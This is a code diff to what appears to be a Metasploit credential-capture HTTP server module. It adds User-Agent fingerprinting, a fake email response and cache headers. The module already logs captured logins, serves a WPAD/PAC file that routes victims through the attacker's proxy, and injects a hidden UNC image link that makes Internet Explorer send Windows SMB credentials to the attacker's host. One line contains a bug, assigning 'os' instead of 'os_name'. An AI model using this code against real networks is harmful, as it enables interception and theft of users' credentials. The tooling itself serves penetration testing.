@@ -71,7 +71,9 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 	
 	def on_client_data(cli)
 		begin
-			case cli.request.parse(cli.get)
+			data = cli.get_once(-1, 5)
+			case cli.request.parse(data)
+			
 				when Rex::Proto::Http::Packet::ParseCode::Completed
 					dispatch_request(cli, cli.request)
 
@@ -79,22 +81,61 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 				when  Rex::Proto::Http::Packet::ParseCode::Error
 					close_client(cli)
 			end
-		rescue EOFError
-			if (cli.request.completed?)
-				dispatch_request(cli, cli.request)
-
-				cli.reset_cli
-			end
-
-			close_client(cli)
+		rescue ::EOFError, ::Errno::EACCES, ::Errno::ECONNABORTED, ::Errno::ECONNRESET
+		rescue ::Exception
+			print_status("Error: #{$!.class} #{$!} #{$!.backtrace}")
 		end
+		
+		close_client(cli)
 							
 	end
 
 	def close_client(cli)
+		cli.close
 	end
 	
 	def dispatch_request(cli, req)
+		
+		os_name = nil
+		os_type = nil
+		os_vers = nil
+		os_arch = 'x86'
+		
+		ua_name = nil
+		ua_vers = nil
+		
+		ua = req['User-Agent']
+
+		case (ua) 
+			when /rv:([\d\.]+)/
+				ua_name = 'FF'
+				ua_vers = $1
+			when /Mozilla\/[0-9]\.[0-9] \(compatible; MSIE ([0-9]\.[0-9]+)/:
+				ua_name = 'IE'
+				ua_vers = $1
+			when /Version\/(\d+\.\d+\.\d+).*Safari/
+				ua_name = 'Safari'
+				ua_vers = $1
+		end
+		
+		case (ua)
+			when /Windows/
+				os_name = 'Windows'
+			when /Linux/
+				os_name = 'Linux'
+			when /iPhone/
+				os_name = 'iPhone'
+				os_arch = 'armle'
+			when /Mac OS X/
+				os = 'Mac'
+		end
+		
+		case (ua)
+			when /PPC/
+				os_arch = 'ppc'
+		end
+		
+		os_name ||= 'Unknown'
 		
 		mysrc = Rex::Socket.source_address(cli.peerhost)
 		hhead = (req['Host'] || @myhost).split(':', 2)[0]
@@ -114,6 +155,21 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 			print_status("HTTP LOGIN #{cli.peerhost} > #{hhead}:#{@myport} #{user} / #{pass} => #{req.resource}")
 		end
 		
+		
+		if(req.resource =~ /\.eml$/) 
+				eml = "To: User\r\nFrom: Support\r\nSubject: Failed to connect\r\n\r\nInternet access has been prohibited by the administrator\r\n"
+				res = 
+				"HTTP/1.1 200 OK\r\n" +
+				"Host: #{hhead}\r\n" +
+				"Content-Type: message/rfc822\r\n" +
+				"Content-Length: #{eml.length}\r\n" +
+				"Connection: Close\r\n\r\n#{eml}"
+			print_status("HTTP EML sent to #{cli.peerhost}")
+			cli.put(res)
+			return	
+			
+		end
+		
 		if(req.resource =~ /^wpad.dat|.*\.pac$/i) 
 			prx = "function FindProxyForURL(url, host) { return 'PROXY #{mysrc}:#{@myport}'; }"
 			res = 
@@ -127,7 +183,7 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 			return
 		end
 		
-		print_status("HTTP REQUEST #{cli.peerhost} > #{hhead}:#{@myport} #{req.method} #{req.resource}")
+		print_status("HTTP REQUEST #{cli.peerhost} > #{hhead}:#{@myport} #{req.method} #{req.resource} #{os_name} #{ua_name} #{ua_vers}")
 		
 		
 		# The google maps / stocks view on the iPhone
@@ -149,9 +205,7 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 		end
 		
 		
-		
-		# SMB MITM / RELAY
-		
+		# Background image
 		body_extra = ""
 		if(@bgimage)
 			img_ext = @bgimage.split(".")[-1].downcase
@@ -192,11 +246,18 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 		end
 		
 		
+		data = "<html><head><title>Connecting...</title></head><body>#{body_extra}"
+		if(ua_name == "IE")
+			data << "<img src='\\\\#{mysrc}\\public#{Time.now.to_i.to_s}\\loading.jpg' width='1' height='1'>"
+		end
 		
-		data = "<html><head><title>Connecting...</title></head><body>#{body_extra}<img src='\\\\#{mysrc}\\public\\loading.jpg' width='1' height='1'></body></html>"
+		data << "</body></html>"
+		
 		res  = 
 			"HTTP/1.1 200 OK\r\n" +
 			"Host: #{mysrc}\r\n" +
+			"Expires: 0\r\n" +
+			"Cache-Control: must-revalidate\r\n" +
 			"Content-Type: text/html\r\n" +
 			"Content-Length: #{data.length}\r\n" +
 			"Connection: Close\r\n\r\n#{data}"
@@ -205,8 +266,6 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 		return		
 	
 	end
-
-
 
 end
 end
